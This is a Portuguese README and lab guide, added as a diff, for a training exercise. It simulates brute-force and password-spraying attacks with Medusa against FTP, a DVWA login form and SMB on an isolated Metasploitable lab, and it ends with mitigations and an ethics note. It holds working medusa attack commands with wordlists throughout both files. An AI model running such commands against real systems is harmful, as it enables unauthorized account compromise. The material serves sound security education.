@@ -1,0 +1,237 @@
+# README.md — Projeto DIO: Simulação de Ataques de Força Bruta com Medusa (Kali + Metasploitable)
+
+## Resumo
+
+Este repositório contém a documentação do projeto realizado para o desafio da DIO: simular ataques de força bruta e password spraying usando **Medusa** em um ambiente controlado (Kali Linux + Metasploitable2/DVWA). O alvo (up) tem o IP **192.168.56.102**. A máquina atacante (Kali) está em **192.168.56.101** (exemplo).
+
+**Objetivo:** Demonstrar entendimento de ataques de força-bruta contra FTP, formulário web (DVWA) e SMB, documentar os procedimentos, coletar evidências e propor mitigações.
+
+---
+
+## Estrutura do repositório
+
+```
+README.md
+lab-guide.md
+wordlists/
+  users_simple.txt
+  passwords_simple.txt
+evidence/
+  medusa_ftp_out.txt
+  medusa_http_out.txt
+  medusa_smb_out.txt
+  captura_lab.pcap
+  screenshots/
+```
+
+---
+
+## Ambiente
+
+* VirtualBox: 2 VMs (Kali Linux e Metasploitable2 com DVWA).
+* Rede: Host-only / Internal Network (isolada).
+* IPs de exemplo:
+
+  * Kali: 192.168.56.103
+  * Metasploitable/DVWA (alvo - "up"): 192.168.56.102
+* Snapshots criados antes dos testes.
+
+Ferramentas usadas:
+
+* medusa
+* nmap
+* tcpdump / wireshark
+* ftp / smbclient / curl
+* git (para versionamento)
+
+---
+
+## Metodologia
+
+1. **Planejamento**: definir objetivos, criar wordlists simples, preparar snapshots.
+2. **Enumeração**: mapear portas e serviços com nmap.
+3. **Execução**: usar medusa para testes de força-bruta em FTP, web-form e SMB (password spraying).
+4. **Evidências**: salvar saídas, capturar pcap e screenshots.
+5. **Mitigação**: listar recomendações técnicas.
+
+---
+
+## Enumeração 
+
+```bash
+nmap -sV -p 21,22,80,445,139 192.168.56.102
+```
+
+Anote serviços relevantes (FTP:21, SSH:22, HTTP:80, SMB:445/139).
+
+---
+
+## Wordlists utilizadas
+
+* `wordlists/users_simple.txt` (exemplo curto para demonstração). Conteúdo:
+
+  * admin
+  * user
+  * root
+  * test
+
+* `wordlists/passwords_simple.txt` (exemplo curto):
+
+  * 123456
+  * password
+  * admin
+  * qwerty
+
+* Observação: também é possível usar `/usr/share/wordlists/rockyou.txt` para testes mais extensos. Documente sempre a origem da lista.
+
+---
+
+## Comandos usados (resumo)
+
+### FTP
+
+```bash
+medusa -M ftp -h 192.168.56.102 -U wordlists/users_simple.txt -P wordlists/passwords_simple.txt -t 8 -f -o evidence/medusa_ftp_out.txt
+```
+
+### Web form (DVWA)
+
+> Dependendo da versão do medusa, o suporte a formulários pode variar. Ajuste o comando conforme o módulo disponível (`http`, `web-form`) ou use `hydra`/`curl` se necessário.
+
+Exemplo ilustrativo (ajuste `-m` conforme o seu form):
+
+```bash
+medusa -M http -h 192.168.56.102 -m FORM:'/dvwa/login.php:username:password:Login=Login' -U wordlists/users_simple.txt -P wordlists/passwords_simple.txt -t 6 -o evidence/medusa_http_out.txt
+```
+
+### SMB (password spraying)
+
+```bash
+medusa -M smbnt -h 192.168.56.102 -U wordlists/users_simple.txt -P wordlists/passwords_simple.txt -t 10 -o evidence/medusa_smb_out.txt
+```
+
+---
+
+## Validação das descobertas
+
+* Teste manual com o cliente encontrado:
+
+  * FTP: `ftp 192.168.56.102` e tente login.
+  * SMB: `smbclient -L //192.168.56.102 -U usuario`.
+  * Web: login via navegador com credenciais encontradas.
+* Consolide evidências em `evidence/` (saídas de medusa, screenshots, pcap).
+
+---
+
+## Mitigações e recomendações
+
+* Implementar política de senhas fortes (comprimento e complexidade).
+* Rate limiting e bloqueio de conta após N tentativas.
+* Adotar MFA para serviços críticos.
+* Habilitar logging e alertas rápidos (SIEM) para detecção de brute force.
+* Para SMB: desabilitar SMBv1, aplicar ACLs e segmentar rede.
+* Para formulários web: CAPTCHA, WAF, limitar tentativas por IP, análise de comportamento.
+
+---
+
+## Conclusão
+
+Descreva aqui os aprendizados pessoais, limitações do teste e sugestões de continuidade (ex.: testar lockout, experimentar wordlists maiores, medir tempo para comprometer senhas fracas).
+
+---
+
+## Observações éticas
+
+Este trabalho foi realizado exclusivamente em VMs isoladas com permissão (ambiente controlado). Nunca execute testes de intrusão em sistemas sem autorização explícita.
+
+---
+
+# lab-guide.md — Guia passo-a-passo (comandos práticos)
+
+> **IMPORTANTE:** Execute estes passos em um ambiente isolado (Host-only). Substitua IPs conforme seu lab. O alvo (up) é **192.168.56.102**.
+
+## 1) Preparação
+
+1. Faça snapshot das VMs.
+2. No Kali:
+
+```bash
+sudo apt update && sudo apt upgrade -y
+sudo apt install medusa nmap tcpdump wireshark smbclient -y
+```
+
+3. Crie diretório do projeto e wordlists:
+
+```bash
+mkdir -p ~/dio-medusa-project/wordlists ~/dio-medusa-project/evidence
+cd ~/dio-medusa-project
+echo -e "admin\nuser\ntest\nroot" > wordlists/users_simple.txt
+echo -e "123456\npassword\nadmin\nqwerty" > wordlists/passwords_simple.txt
+```
+
+## 2) Enumeração
+
+```bash
+nmap -sV -p- 192.168.56.102 -oA ~/dio-medusa-project/evidence/nmap_full
+# Resultado: anote portas FTP(21), HTTP(80), SMB(445/139) etc.
+```
+
+## 3) Captura de tráfego (opcional — em outra shell)
+
+```bash
+sudo tcpdump -i any host 192.168.56.102 -w ~/dio-medusa-project/evidence/captura_lab.pcap
+# Pare a captura quando terminar (Ctrl+C)
+```
+
+## 4) Ataque FTP com Medusa
+
+```bash
+medusa -M ftp -h 192.168.56.102 -U ~/dio-medusa-project/wordlists/users_simple.txt -P ~/dio-medusa-project/wordlists/passwords_simple.txt -t 8 -f -o ~/dio-medusa-project/evidence/medusa_ftp_out.txt
+```
+
+* Verifique `evidence/medusa_ftp_out.txt` para credenciais encontradas.
+* Teste login manual com `ftp 192.168.56.102`.
+
+## 5) Ataque a formulário web (DVWA)
+
+1. Abra o DVWA no navegador `http://192.168.56.102/dvwa` e coloque o nível de segurança em **low**.
+2. Capture a requisição de login (DevTools > Network) e adapte o comando do Medusa.
+3. Comando exemplo (ajuste `-m` conforme o form):
+
+```bash
+medusa -M http -h 192.168.56.102 -m FORM:'/dvwa/login.php:username:password:Login=Login' -U ~/dio-medusa-project/wordlists/users_simple.txt -P ~/dio-medusa-project/wordlists/passwords_simple.txt -t 6 -o ~/dio-medusa-project/evidence/medusa_http_out.txt
+```
+
+* Se o Medusa não funcionar para o formulário, use `hydra` ou um script `curl` para automatizar tentativas e documente a razão.
+
+## 6) Password spraying / SMB
+
+```bash
+medusa -M smbnt -h 192.168.56.102 -U ~/dio-medusa-project/wordlists/users_simple.txt -P ~/dio-medusa-project/wordlists/passwords_simple.txt -t 10 -o ~/dio-medusa-project/evidence/medusa_smb_out.txt
+```
+
+* Estratégia: tentar 1-2 senhas comuns por muitos usuários (evitar lockout por tentativa sequencial).
+* Validação: `smbclient -L //192.168.56.102 -U usuario`.
+
+## 7) Coletar evidências
+
+* Pare tcpdump e abra pcap no Wireshark para gerar screenshots.
+* Salve outputs do medusa (já gravados em `evidence/`).
+* Tire screenshots do DVWA logado (se aplicável).
+
+## 8) Limpeza e entrega
+
+* Remova arquivos sensíveis se for publicar em portfólio (evite publicar senhas reais). Para fins educacionais, mantenha wordlists e outputs anônimos.
+* `git init` → `git add .` → `git commit -m "feat: add medusa lab documentation and evidence"` → criar repositório no GitHub e dar push.
+
+---
+
+## Observações finais
+
+* Documente limitações: por exemplo, dependência do módulo http do Medusa; explicar se usou Hydra/curl em alternativa.
+* Sugira próximos passos: testar lockout, implementar scripts para automação categorizada, medir tempo médio de quebra para cada serviço.
+
+---
+
+**FIM DO DOCUMENTO**
+
